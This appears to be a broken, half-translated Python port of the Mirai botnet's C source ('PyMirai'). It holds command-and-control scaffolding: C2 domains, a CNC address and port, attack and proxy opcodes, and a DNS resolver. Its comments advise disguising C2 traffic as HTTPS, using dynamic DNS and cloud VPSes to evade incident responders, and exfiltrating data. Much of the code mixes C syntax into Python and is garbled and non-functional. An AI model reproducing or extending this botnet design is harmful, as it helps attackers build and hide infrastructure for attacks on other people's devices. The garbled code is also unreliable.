import os, dns, socket, operator, sys, httplib, ssl
from dns import *
#pragma once

#include <unistd.h>
#include <stdint.h>domain, nslist=
#include <stdarg.h>

# consider changing C2 traffic from basic TCP handshakes to HTTPS with SSL
# HTTPS is widely supported among all OSes and IoT devices
# combined with SSL, the traffic is difficult to distinguish from legitimate traffic
# Can be used for exfil purposes, a manual option for the operator of the C2, it's faster than DNS tunneling
# proposed ports to be used, 80, 8080, 8081, 443, 8443
# if SSL handshake fails, resort to cleartext HTTP but always attempt to renegotiate SSL session periodically (every 10 minutes)
class https_transport(object):
	def __init__(self, domain, port, keyfile):
		self.domain = domain
		self.port = port
		self.keyfile = keyfile
	def c2_request(domain, port):
		return session
	def ssl_negotiation(domain, keyfile):
		return
# instead of static ipv4 addresses in public namespace, from now on, PyMirai will instead be designed to resolve dynamic DNS addresses provided by dyndns or similar services
# that means your IP address can change but the DNS system will always point to your C2
# creates a moving target making it harder for responders to track you.
# meanwhile it allows you to constantly break down and redeploy your Command-And-Control C2 and adjust the public DNS records to point back to your C2 VPS from services like...
# Amazon Web Services, DigitalOcean, Vultr, etc.
class dns_resolver(object):
	def __init__(self, domain, nslist=[], manualip={}, nat={}):
		self.res = dns.resolver.Resolver()
		self.domain = domain
		self.mastername = None
		self.manualip = manualip
		self.nat = nat
		qns = dns.message.make_query(domain+".",'NS')
		qns.flags = 0
		self.qns = qns
		if nslist:
			self.setnslist_direct(nslist)
			self.resolve_ips()
	def gen_ips(self):
		# resolve IP addresses from self.nslist
		# take manualip and nat tables into account
		tcp = False
		for fqdn in self.nslist:
			fqdn = fqdn.upper()
			if fqdn in self.manualip:
				yield True, (False, fqdn, self.manualip[fqdn])
				continue
			n = 0
			for t in ['A','AAAA']:
				try:
					aip = self.res.query(fqdn, t, tcp=tcp)
				except dns.resolver.NoAnswer:
					continue
				except dns.resolver.NXDOMAIN:
					continue
				except dns.exception.Timeout:
					continue
				except dns.resolver.NoNameServers:
					continue
				iplist = [ip.to_text() for ip in aip.rrset.items]
				natlist = []
				for ip in iplist:
					if ip in self.nat:
						natlist.append(self.nat[ip])
					else:
						natlist.append(ip)
				yield True, (True, fqdn, natlist)
				n += 1
			if n == 0:
				yield None, (None, fqdn, [])
			print natlist, iplist

# list of dynamic DNS addresses that point to C2
dns_resolver.nslist = ['xjkgn.rogue-servers.net', 'jgnsnxt.amazon-aws.net', 'oiimfsw.dyndns.net']
dns_resolver.gen_ips(dns_resolver.nslist)
STDIN	= 0
STDOUT	= 1
STDERR	= 2

False	= 0
True	= 1
# typedef BOOL
#
# typedef ipv4_t
# typedef port_t

# ipv4_t = "0.0.0.0"
def ipv4_t(addr):
	return addr
port_t = 48101
def htonl(string):
	string = socket.htonl(string)
	return string
def INET_ADDR(o1,o2,o3,o4):	return (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))

SINGLE_INSTANCE_PORT	= 48101
# okay, i am not sure. Online reports say Mirai is documented to connect to this ipv4 address
# if this is a "fake address" well okay then...
# but... how about a cloud-friendly dynamic DNS address solution?!?
# that way, you can change your IP (in accordance to the VPSes on the cloud), but as long as DNS properly propagates, then C2 will always catch the connection
DYNAMIC_DNS_ADDR = "xjkgn.rogue-servers.net"

# these variables are imported into another c file in this directory
FAKE_CNC_ADDR	= INET_ADDR(65,222,202,53)
FAKE_CNC_PORT	= 80

CNC_OP_PING	= 0x00
CNC_OP_KILLSELF	= 0x10
CNC_OP_KILLATTKS	= 0x20
CNC_OP_PROXY	= 0x30
CNC_OP_ATTACK	= 0x40

ipv4_t(LOCAL_ADDR)
# ipv4_t LOCAL_ADDR
outptr = ""
#ifdef DEBUG
static outptr
def xputc(c):
	if outptr:
		# *outptr++ = (unsigned char)c
		outptr = outptr + c
		return
	else:
		os.write(0, &c, 1)

def xputs(string):
	while string:
		xputc(string += string)

def va_list(arp):
	return arp
def va_start(arp, fmt):
	return
def va_end(arp):
	return
fmt = ""
def xvprintf(fmt, va_list(arp)):
	unsigned r, i, j, w, f
	unsigned v
	while True:
		c = *fmt += 1					# Get a char
		if not c: break				# End of format?
		if c != '%':				# Pass through it if not a % sequense
			xputc(c); continue
		f = 0
		c = *fmt += 1					# Get first char of the sequense
		if c == '0':				# Flag: '0' padded
			f = 1; c = *fmt += 1
		else:
			if c == '-':			# Flag: left justified
				f = 2; c = *fmt += 1
		for (w = 0; c >= '0' and c <= '9'; c = *fmt++)	# Minimum width
			w = w * 10 + c - '0'
		if c == 'l' or c == 'L':	# Prefix: Size is long int
			f |= 4; c = *fmt += 1
		if not c: break				# End of format?
		d = c
		#toupper
		if d >= 'a': d -= 0x20
		switch d:				# Type is...
		case 'S' :					# String
			p = va_arg(arp, )
			for (j = 0; p[j]; j++)
			while not (f & 2) and j++ < w) xputc(' ':
			xputs(p)
			while j++ < w) xputc(' ':
			continue
		case 'C' :					# Character
			xputc((char)va_arg(arp, int)); continue
		case 'B' :					# Binary
			r = 2; break
		case 'O' :					# Octal
			r = 8; break
		case 'D' :					# Signed decimal
		case 'U' :					# Unsigned decimal
			r = 10; break
		case 'X' :					# Hexdecimal
			r = 16; break
		default:					# Unknown type (passthrough)
			xputc(c); continue

		# Get an argument and put it in numeral
		v = (f & 4) ? va_arg(arp, long) : ((d == 'D') ? (long)va_arg(arp, int) : (long)va_arg(arp, unsigned int))
		if d == 'D' and (v & 0x80000000):
			v = 0 - v
			f |= 8
		i = 0
		while True:
			d = (char)(v % r); v /= r
			if d > 9) d += (c == 'x': ? 0x27 : 0x07
			s[i++] = d + '0'
		    if not (v and i < sizeof(s)): break	# DO-WHILE TERMINATOR -- INDENTATION CAN BE WRONG
		if f & 8: s[i++] = '-'
		j = i; d = (f & 1) ? '0' : ' '
		while not (f & 2) and j++ < w) xputc(d:
		do xputc(s[--i]); while i:
		while j++ < w) xputc(' ':

def xprintf(const fmt, ...):
	#va_list arp
	va_list(arp)
	va_start(arp, fmt)
	xvprintf(fmt, arp)
	va_end(arp)
printf	= xprintf

#endif
